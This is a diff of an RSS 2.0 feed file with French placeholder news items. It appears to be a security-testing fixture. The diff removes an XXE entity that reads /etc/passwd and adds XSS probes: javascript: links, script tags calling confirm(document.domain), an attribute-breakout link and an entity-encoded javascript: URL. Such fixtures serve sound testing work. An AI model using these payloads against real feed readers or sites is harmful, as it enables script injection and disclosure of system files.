@@ -1,25 +1,33 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE data [
-<!ELEMENT data (#ANY)>
-<!ENTITY file SYSTEM "file:///etc/passwd">
-]>
 <rss version="2.0">
     <channel>
-        <title>mon site &file; mon site</title>
+        <title>aeuieiua</title>
         <description>Ceci est un exemple de flux RSS 2.0</description>
         <lastBuildDate>Sat, 07 Sep 2002 00:00:01 GMT</lastBuildDate>
-        <link>http://www.example.org</link>
+        <link>javascript:alert(123)</link>
         <item>
             <title>Actualité N°1</title>
-            <description>Ceci est ma première actualité</description>
+            <description><![CDATA[Ceci est ma première actualité <script>confirm(document.domain)</script>]]></description>
             <pubDate>Sat, 07 Sep 2002 00:00:01 GMT</pubDate>
-            <link>http://www.example.org/actu1</link>
+            <link>javascript:alert(123)</link>
         </item>
         <item>
             <title>Actualité N°2</title>
             <description>Ceci est ma seconde actualité</description>
             <pubDate>Sat, 07 Sep 2002 00:00:01 GMT</pubDate>
-            <link>http://www.example.org/actu2</link>
+            <link>http://www.example.org/actu2"><script>alert('XSS')</script></link>
+        </item>
+        <item>
+            <title>Actualité N°3</title>
+            <description><![CDATA[Ceci est ma première actualité <script>confirm(document.domain)</script>]]></description>
+            <pubDate>Sat, 07 Sep 2002 00:00:01 GMT</pubDate>
+            <link>%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341</link>
+        </item>
+        <item>
+            <title>Actualité N°4</title>
+            <description>Ceci est ma seconde actualité</description>
+            <pubDate>Sat, 07 Sep 2002 00:00:01 GMT</pubDate>
+            <link>http://www.example.org/actu2"><script>alert('XSS')</script></link>
         </item>
     </channel>
 </rss>
